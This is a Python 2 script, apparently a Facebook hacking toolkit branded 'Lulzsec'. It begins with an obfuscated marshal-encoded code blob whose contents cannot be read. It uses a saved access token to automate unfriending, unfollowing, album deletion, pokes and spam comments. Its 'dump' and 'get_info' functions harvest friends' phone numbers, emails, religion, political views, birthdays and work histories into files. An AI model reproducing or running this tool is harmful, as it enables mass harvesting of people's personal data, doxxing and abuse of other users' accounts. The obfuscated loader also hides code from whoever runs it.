x00i\xd4\x00\x00\x00i\xe4\x00\x00\x00i\x05\x00\x00\x00i\x02\x00\x00\x00i\xfd\x00\x00\x00i=\x00\x00\x00i$\x00\x00\x00io\x00\x00\x00i\x08\x00\x00\x00i\x8f\x00\x00\x00i\x9f\x00\x00\x00i\xb1\x00\x00\x00i\xff\x00\x00\x00i\xcc\x00\x00\x00i(\x00\x00\x00if\x00\x00\x00i<\x00\x00\x00i\xc0\x00\x00\x00i\x07\x00\x00\x00iM\x00\x00\x00i\xaf\x00\x00\x00i\xfc\x00\x00\x00i9\x00\x00\x00ia\x00\x00\x00i\xe2\x00\x00\x00i6\x00\x00\x00iA\x00\x00\x00i\xf0\x00\x00\x00i\x82\x00\x00\x00iy\x00\x00\x00i\x7f\x00\x00\x00i~\x00\x00\x00i\x04\x00\x00\x00i}\x00\x00\x00i\x8b\x00\x00\x00i{\x00\x00\x00i\xd9\x00\x00\x00i\xca\x00\x00\x00i\xb5\x00\x00\x00i7\x00\x00\x00iq\x00\x00\x00it\x00\x00\x00i\xee\x00\x00\x00ib\x00\x00\x00i\xfe\x00\x00\x00iL\x00\x00\x00iR\x00\x00\x00i\xf3\x00\x00\x00i\x1e\x00\x00\x00i\xd8\x00\x00\x00i\xfb\x00\x00\x00iT\x00\x00\x00i\x03\x00\x00\x00i\xe5\x00\x00\x00i\'\x00\x00\x00ip\x00\x00\x00i\xf4\x00\x00\x00is\x00\x00\x00i\xce\x00\x00\x00i\xdb\x00\x00\x00iU\x00\x00\x00ir\x00\x00\x00i\x12\x00\x00\x00i\x1c\x00\x00\x00i\xec\x00\x00\x00iG\x00\x00\x00i\n\x00\x00\x00i\x0c\x00\x00\x00i\xba\x00\x00\x00i\xdf\x00\x00\x00im\x00\x00\x00i\xa4\x00\x00\x00i\xa9\x00\x00\x00i\xa8\x00\x00\x00i\x96\x00\x00\x00i\\\x00\x00\x00iO\x00\x00\x00i\x83\x00\x00\x00i\x84\x00\x00\x00ih\x00\x00\x00i\xc8\x00\x00\x00i\xa6\x00\x00\x00i\x99\x00\x00\x00il\x00\x00\x00i\xf2\x00\x00\x00i\xc3\x00\x00\x00i\xf9\x00\x00\x00i0\x00\x00\x00i\x10\x00\x00\x00iY\x00\x00\x00i\x97\x00\x00\x00i\x8e\x00\x00\x00i\xf6\x00\x00\x00iK\x00\x00\x00i\x13\x00\x00\x00i\xde\x00\x00\x00ie\x00\x00\x00i\xa2\x00\x00\x00i\x14\x00\x00\x00i\xfa\x00\x00\x00i\x86\x00\x00\x00i\x9b\x00\x00\x00i&\x00\x00\x00iz\x00\x00\x00i_\x00\x00\x00ij\x00\x00\x00iu\x00\x00\x00iW\x00\x00\x00i\xea\x00\x00\x00i\xac\x00\x00\x00i%\x00\x00\x00i2\x00\x00\x00i@\x00\x00\x00i\xb2\x00\x00\x00i\x93\x00\x00\x00i\xe8\x00\x00\x00i>\x00\x00\x00iN\x00\x00\x00i\xdd\x00\x00\x00i\x89\x00\x00\x00i\xa0\x00\x00\x00i\xcb\x00\x00\x00i\x1b\x00\x00\x00i\xd3\x00\x00\x00i|\x00\x00\x00i\x88\x00\x00\x00i\xae\x00\x00\x00i\xd7\x00\x00\x00i\x01\x00\x00\x00i\xe9\x00\x00\x00i\x1f\x00\x00\x00i\xb7\x00\x00\x00i\x0e\x00\x00\x00i\xaa\x00\x00\x00i\xad\x00\x00\x00i1\x00\x00\x00i\xf7\x00\x00\x00i\xe1\x00\x00\x00i\xd1\x00\x00\x00i/\x00\x00\x00iZ\x00\x00\x00i\xc9\x00\x00\x00i\xd6\x00\x00\x00iC\x00\x00\x00iX\x00\x00\x00i\xf5\x00\x00\x00i\xeb\x00\x00\x00i\xe0\x00\x00\x00i\x91\x00\x00\x00i\xc2\x00\x00\x00i \x00\x00\x00i-\x00\x00\x00iQ\x00\x00\x00i^\x00\x00\x00i\x0f\x00\x00\x00i\x9d\x00\x00\x00i\xd5\x00\x00\x00i\x8d\x00\x00\x00i\xd2\x00\x00\x00iE\x00\x00\x00iP\x00\x00\x00i.\x00\x00\x00i3\x00\x00\x00i\xda\x00\x00\x00i,\x00\x00\x00i\xe6\x00\x00\x00i\x85\x00\x00\x00i\xbb\x00\x00\x00iD\x00\x00\x00i\xbc\x00\x00\x00i;\x00\x00\x00iw\x00\x00\x00i+\x00\x00\x00i?\x00\x00\x00ix\x00\x00\x00i\xa1\x00\x00\x00i\xf8\x00\x00\x00i\x1d\x00\x00\x00i\xf1\x00\x00\x00i\x95\x00\x00\x00i\x9e\x00\x00\x00i\xb3\x00\x00\x00ik\x00\x00\x00i\x9c\x00\x00\x00i\x1a\x00\x00\x00t\x00\x00\x00\x00(\t\x00\x00\x00t\x07\x00\x00\x00marshalt\x01\x00\x00\x00dt\x01\x00\x00\x00et\x01\x00\x00\x00it\x01\x00\x00\x00jt\x01\x00\x00\x00kt\x03\x00\x00\x00lent\x03\x00\x00\x00chrt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x08\x00\x00\x00<script>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x92\x00\x00\x00\x0c\x01\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\x1e\x01\x06\x01\x12\x01\xff\x00\xff\x00\xff\x00\x06\x01\x03\x01\x12\x00\x04\x01\x12\x00\t\x01\x1c\x01\n\x01\x0e\x01')
	
def unfollow(posts):
	global token , WT

	print '\r[*] all id successfully retrieved    '
	print '[*] start'

	try:
		counter = 0
		for post in posts['data']:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&access_token=' + token)
			a = json.loads(r.text)

			try:
				cek = a['error']['nessage']
				print W + '[' + R + post['name'] + W + '] failed'
			except TypeError:
				print W + '[' + G + post['name'] + W + '] unfollow'
		print '[*] done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		bot()
def poke(posts):
	global token , WT

	print '\r[*] all id successfully retrieved                  '
	print '[*] start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/%s/pokes?access_token=%s'%(post['id'].split('_')[0],token))
			a = json.loads(r.text)

			id = post['id'].split('_')[0]
			try:
				cek = a['error']['message']
				print W + '[' + R + id + W + '] failed'
			except TypeError:
				print W + '[' + G + id + W + '] pokes'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped   '
		bot()
	except (requests.exceptions.ConnectionError):
		print '[!] Connection Error'
		bot()
def albums(posts):
	global token , WT

	print '\r[*] all id successfully retrieved                 '
	print '[*] Start'

	try:
		counter = 0
		for post in posts:
			if counter >= 50:
				break

			r = requests.post('https://graph.facebook.com/'+post['id']+'?method=delete&access_token='+token)
			a = json.loads(r.text)

			try:
				cek = a['error']['message']
				print W + '[' + R + post['name'] + W + '] Failed'
			except TypeError:
				print W + '[' + G + post['name'] + W + '] femoved'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped  '
		bot()
	except (requests.exceptions.ConnectionError):
		print '[!] connection error'
		bot()
######################################################################################################################
#			    Bot reaction
  			   # Prepairing #
def menu_reaction_ask():
  try:
	global type

	cek = raw_input(R + 'Lulzsec' + W + '/' + R + 'Bot' + W + '/' + R + 'Reaction' + W + ' >> ')

	if cek in ['1','01']:
		type = 'LIKE'
		bot_ask()
	elif cek in ['2','02']:
		type = 'LOVE'
		bot_ask()
	elif cek in ['3','03']:
		type = 'WOW'
		bot_ask()
	elif cek in ['4','04']:
		type = 'HAHA'
		bot_ask()
	elif cek in ['5','05']:
		type = 'SAD'
		bot_ask()
	elif cek in ['6','06']:
		type = 'ANGRY'
		bot_ask()
	elif cek.lower() == 'menu':
		menu_reaction()
		menu_reaction_ask()
	elif cek.lower() == 'exit':
		print '[!] Exiting program !!'
		sys.exit()
	elif cek.lower() == 'token':
		try:
			open('cookie/token.log')
			print '[!] an access token already exists'
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print '[*] Canceling '
				bot()
		except IOError:
			pass

		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	elif cek in ['0','00']:
		print '[!] back to bot menu'
		bot()

	else:
		if cek == '':
			menu_reaction_ask()
		else:
			print "[!] command '" + cek + "' not found"
			print "[!] type 'menu' to show menu bot"
			menu_reaction_ask()
  except KeyboardInterrupt:
	menu_reaction_ask()

def bot_ask():
	global id , WT , token

	print '[*] load access token '
	try:
		token = open('cookie/token.log','r').read()
		print '[*] Success load access token'
	except IOError:
		print '[!] Failed load access token'
		print "[!] type 'token' to generate access token"
		menu_reaction_ask()

	WT = raw_input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
	if WT.upper() == 'T':
		id = raw_input('[?] id facebook : ')
		if id == '':
			print "[!] id target can't be empty"
			print '[!] Stopped'
			menu_reaction_ask()

	else:
		WT = 'wallpost'
	like(post(),50)

def bot():
  try:
	global type , message , id , WT , token

	cek = raw_input(R + 'Lulzsec' + W +'/' + R +'Bot ' + W + '>> ')

	if cek in ['1','01']:
		menu_reaction()
		menu_reaction_ask()
	elif cek in ['2','02']:
		print '[*] load access token'
		try:
			token = open('cookie/token.log','r').read()
		        print '[*] Success load access token'
		except IOError:
	                print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
	                bot()

		WT = raw_input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
		if WT.lower() == "w" or WT.lower() == '':
			WT = 'wallpost'
		else:
			id = raw_input('[?] Id Target : ')

			if id == '':
				print "[!] id target can't be empty"
				print '[!] Stopped'
				bot()

		print '--------------------------------------------------'
		print "  [Note] Use the '</>' symbol to change the line\n"

		message = raw_input('[?] Your Message : ')
		if message == '':
			print "[!] Message can't be empty"
			print '[!] Stopped'
			bot()
		else:
			message = message.replace('</>','\n')

		comment(post(),50)

	elif cek in ['4','04']:
		WT = 'req'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token   '
			print "[!] type 'token' to generate access token"
			bot()
		confirm(post())
	elif cek in ['3','03']:
		WT = 'wallpost'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		poke(post())
	elif cek in ['5','05']:
		WT = 'me'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		remove(post())

	elif cek in ['6','06']:
		WT = 'friends'
		print '[*] load access token     '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		unfriend(post())

	elif cek in ['7','07']:
		WT = 'subs'
		print '[*] load access token      '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		unfollow(post())
	elif cek in ['8','08']:
		WT = 'albums'
		print '[*] Load access token      '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
		albums(post())

	elif cek in ['0','00']:
		print '[*] Back to main menu'
		main()
	elif cek.lower() == 'menu':
		menu_bot()
		bot()
	elif cek.lower() == 'exit':
		print '[!] Exiting program'
		sys.exit()
	elif cek.lower() == 'token':
		try:
			open('cookie/token.log')
			print '[!] an access token already exists'
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print '[*] Canceling '
				bot()
		except IOError:
			pass

		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	else:
		if cek == '':
			bot()
		else:
			print "[!] command '"+cek+"' not found"
			print '[!] type "menu" to show menu bot'
			bot()
  except KeyboardInterrupt:
	bot()
#
###############################################################################

###############################################################################
#                         Dump Data

def dump_id():

	print '[*] Load Access Token'
	try:
		token = open("cookie/token.log",'r').read()
		print '[*] success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print '[*] fetching all friends id'
	try:

		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_id.txt','w')
		for i in a['data']:
			out.write(i['id'] + '\n')
			print '\r[*] %s retrieved'%(i['id']),;sys.stdout.flush();time.sleep(0.0001)

		out.close()
		print '\r[*] all friends id successfuly retreived'
		print '[*] file saved : output/' + n[0].split(' ')[0] + '_id.txt'
		main()

	except KeyboardInterrupt:
		print '\r[!] Stopped'
		main()
	except KeyError:
		print '[!] failed to fetch friend id'
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error                 '
		print '[!] Stopped'
		main()

def dump_phone():
	print '[*] load access token'

	try:
		token = open('cookie/token.log','r').read()
		print '[*] Success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print "[*] fetching all phone numbers"
	print '[*] start'

	try:
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_phone.txt','w')

		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
			z = json.loads(x.text)

			try:
				out.write(z['mobile_phone'] + '\n')
				print W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['mobile_phone']
			except KeyError:
				pass
		out.close()
		print '[*] done'
		print "[*] all phone numbers successfuly retrieved"
		print '[*] file saved : output/'+n[0].split(' ')[0] + '_phone.txt'
		main()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		main()
	except KeyError:
		print "[!] failed to fetch all phone numbers"
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error'
		print '[!] Stopped'
		main()

def dump_mail():
	print '[*] load access token'

	try:
		token = open('cookie/token.log','r').read()
                print '[*] Success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print '[*] fetching all emails'
	print '[*] start'

	try:
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
                a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_mails.txt','w')

		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
                        z = json.loads(x.text)

			try:
                                out.write(z['email'] + '\n')
			        print W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['email']
			except KeyError:
				pass
		out.close()

                print '[*] done'
                print "[*] all emails successfuly retrieved"
		print '[*] file saved : output/' + n[0].split(' ')[0] + '_mails.txt'
		main()

	except KeyboardInterrupt:
		print '\r[!] Stopped'
		main()
	except KeyError:
		print "[!] failed to fetch all emails"
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error'
		print '[!] Stopped'
		main()

def dump_id_id():
	global target_id

	print '[*] load access token'

	try:
		token = open('cookie/token.log','r').read()
		print '[*] Success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print '[*] fetching all id from your friend'

	try:
		r = requests.get('https://graph.facebook.com/{id}?fields=friends.limit(5000)&access_token={token}'.format(id=target_id,token=token))
		a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt','w')

		for i in a['friends']['data']:
			out.write(i['id'] + '\n')
			print '\r[*] %s retrieved'%(i['id']),;sys.stdout.flush();time.sleep(0.0001)
		out.close()

		print '\r[*] all friends id successfuly retreived'
		print '[*] file saved : output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt'
		main()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		main()
	except KeyError:
		print '[!] failed to fetch friend id'
		try:
			os.remove('output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt')
		except OSError:
			pass
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error                      '
		print '[!] Stopped'
#
###############################################################################

###############################################################################
#                         Main

def main():
  global target_id

  try:
	cek = raw_input(R + 'Lulzsec' + W +' >> ')

	if cek.lower() == 'get_data':
		if len(jml) == 0:
			getdata()
		else:
			print '[*] You have retrieved %s friends data'%(len(jml))
			main()
	elif cek.lower() == 'get_info':
		print '\n'+'[*] Information Gathering [*]'.center(44) + '\n'
		search()
	elif cek.lower() == 'bot':
		menu_bot()
		bot()
	elif cek.lower() == "cat_token":
		try:
			o = open('cookie/token.log','r').read()
			print '[*] Your access token !!\n\n' + o + '\n'
			main()
		except IOError:
			print '[!] failed to open cookie/token.log'
			print "[!] type 'token' to generate access token"
			main()

	elif cek.lower() == 'clear':
		if sys.platform == 'win32':
			os.system('cls')
			baliho()
			main()
		else:
			os.system('clear')
			baliho()
			main()

	elif cek.lower() == 'token':
		try:
			open('cookie/token.log')
			print '[!] an access token already exists'
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print '[*] Canceling '
				bot()
		except IOError:
			pass

		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	elif cek.lower() == 'rm_token':
		print '''
[Warn] you must create access token again if 
       your access token is deleted
'''
		a = raw_input("[!] type 'delete' to continue : ")
		if a.lower() == 'delete':
			try:
				os.system('rm -rf cookie/token.log')
				print '[*] Success delete cookie/token.log'
				main()
			except OSError:
				print '[*] failed to delete cookie/token.log'
				main()
		else:
			print '[*] failed to delete cookie/token.log'
			main()
	elif cek.lower() == 'about':
		show_program()
		main()
	elif cek.lower() == 'exit':
		print "[!] Exiting Program"
		sys.exit()
	elif cek.lower() == 'help':
		info_ga()
		main()
	elif cek.lower() == 'dump_id':
		dump_id()
	elif cek.lower() == 'dump_phone':
		dump_phone()
	elif cek.lower() == 'dump_mail':
		dump_mail()

	if 'dump_' in cek.lower() and cek.lower().split('_')[2] == 'id':
		target_id = cek.lower().split('_')[1]
		dump_id_id()
	else:
		if cek == '':
			main()
		else:
			print "[!] command '"+cek+"' not found"
			print '[!] type "help" to show command'
			main()
  except KeyboardInterrupt:
	main()
  except IndexError:
	print '[!] invalid parameter on command : ' + cek
	main()
#
######################################################################################################################

################################################################################
#                          Get Data

def getdata():
	global a , token

	print '[*] Load Access Token'

	try:
		token = open("cookie/token.log","r").read()
		print '[*] Success load access token '
	except IOError:
		print '[!] failed to open cookie/token.log'
		print "[!] type 'token' to generate access token"
		main()

	print '[*] fetching all friends data'

	try:
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		a = json.loads(r.text)

	except KeyError:
		print '[!] Your access token is expired'
		print "[!] type 'token' to generate access token"
		main()

	except requests.exceptions.ConnectionError:
		print '[!] Connection Error'
		print '[!] Stopped'
		main()

	for i in a['data']:
		jml.append(i['id'])
		print '\r[*] fetching %s data from friends'%(len(jml)),;sys.stdout.flush();time.sleep(0.0001)

	print '\r[*] '+str(len(jml))+' data of friends successfully retrieved'
	main()

def search():

	if len(jml) == 0:
                print "[!] no friend data in the database"
                print '[!] type "get_data" to collect friends data'
                main()
        else:
                pass

	target = raw_input("[!] Search Name or Id : ")

	if target == '':
		print "[!] name or id can't be empty !!"
		search()
	else:
		info(target)

def info(target):
        global a , token

        print '[*] Searching'
	for i in a['data']:

	  if target in  i['name'] or target in i['id']:

		x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
		y = json.loads(x.text)

		print ' '
		print G + '[-------- INFORMATION --------]'.center(44)
		print W

		try:
			print '\n[*] Id : '+i['id']
		except KeyError:
			pass
		try:
			print '[*] Username : '+y['username']
		except KeyError:
			pass
		try:
			print '[*] Email : '+y['email']
		except KeyError:
			pass
		try:
			print '[*] Mobile Phone : '+y['mobile_phone']
		except KeyError:
			pass
		try:
			print '[*] Name : '+y['name']
		except KeyError:
			pass
		try:
			print '[*] First name : '+y['first_name']
		except KeyError:
			pass
		try:
			print '[*] Midle name : '+y['middle_name']
		except KeyError:
			pass
		try:
			print '[*] Last name : '+y['last_name']
		except KeyError:
			pass
		try:
			print '[*] Locale : '+y['locale'].split('_')[0]
		except KeyError:
			pass
		try:
			print '[*] location : '+y['location']['name']
		except KeyError:
			pass
		try:
			print '[*] hometown : '+y['hometown']['name']
		except KeyError:
			pass
		try:
			print '[*] gender : '+y['gender']
		except KeyError:
			pass
		try:
			print '[*] religion : '+y['religion']
		except KeyError:
			pass
		try:
			print '[*] relationship status : '+y['relationship_status']
		except KeyError:
			pass
		try:
			print '[*] political : '+y['political']
		except KeyError:
			pass
		try:
			print '[*] Work :'

			for i in y['work']:
				try:
					print '   [-] position : '+i['position']['name']
				except KeyError:
					pass
				try:
					print '   [-] employer : '+i['employer']['name']
				except KeyError:
					pass
				try:
					if i['start_date'] == "0000-00":
						print '   [-] start date : ---'
					else:
						print '   [-] start date : '+i['start_date']
				except KeyError:
					pass
				try:
					if i['end_date'] == "0000-00":
						print '   [-] end date : ---'
					else:
						print '   [-] end date : '+i['end_date']
				except KeyError:
					pass
				try:
					print '   [-] location : '+i['location']['name']
				except KeyError:
					pass
				print ' '
		except KeyError:
			pass
		try:
			print '[*] Updated time : '+y['updated_time'][:10]+' '+y['updated_time'][11:19]
		except KeyError:
			pass
		try:
			print '[*] Languages : '
			for i in y['languages']:
				try:
					print ' ~  '+i['name']
				except KeyError:
					pass
		except KeyError:
			pass
		try:
			print '[*] Bio : '+y['bio']
		except KeyError:
			pass
		try:
			print '[*] quotes : '+y['quotes']
		except KeyError:
			pass
		try:
			print '[*] birthday : '+y['birthday'].replace('/','-')
		except KeyError:
			pass
		try:
			print '[*] link : '+y['link']
		except KeyError:
			pass
		try:
			print '[*] Favourite teams : '
			for i in y['favorite_teams']:
				try:
					print ' ~  '+i['name']
				except KeyError:
					pass
		except KeyError:
			pass
		try:
			print '[*] School : '
			for i in y['education']:
				try:
					print ' ~  '+i['school']['name']
				except KeyError:
					pass
		except KeyError:
			pass
	  else:
		pass

        else:
		print W + ' '
		print '[*] Done '
		main()

#
##########################################################################

##########################################################################
#

if __name__ == '__main__':

	baliho()
	main()

#
##########################################################################

